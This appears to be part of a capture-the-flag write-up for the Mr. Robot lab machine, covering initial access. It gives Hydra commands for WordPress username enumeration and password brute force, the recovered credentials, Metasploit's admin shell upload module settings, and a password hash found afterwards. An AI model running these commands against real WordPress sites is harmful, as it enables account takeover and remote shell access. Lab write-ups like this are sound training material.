# 02 - Initial Access

## WordPress Login Enumeration

WordPress returns different error messages for invalid vs valid usernames:

- Invalid username: `ERROR: Invalid username.`
- Valid username: `ERROR: The password you entered for the username ... is incorrect.`

Used Hydra with the filtered wordlist to enumerate valid usernames.

```bash
hydra -L fsocity_filtered.dic -p something <TARGET_IP> http-post-form \
  '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username'
```

Found valid username:

```
elliot
```

---

## Password Brute Force

Targeted `elliot` with the same wordlist.

```bash
hydra -l elliot -P fsocity_filtered.dic <TARGET_IP> http-post-form \
  '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:is incorrect'
```

Recovered password:

```
ER28-0652
```

---

## Metasploit Shell Upload

Logged into WordPress as admin and used Metasploit to gain a shell.

```bash
msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
```

Configured the module:

```text
set RHOSTS <TARGET_IP>
set USERNAME elliot
set PASSWORD ER28-0652
set TARGETURI /
set WpCheck false
run
```

Received a Meterpreter session.

---

## Key 2 Discovery

Navigated the filesystem from the Meterpreter shell.

```bash
cd /home/robot
ls -la
```

Found:

```
key-2-of3.txt
password.raw-md5
```

The `password.raw-md5` file contained:

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```
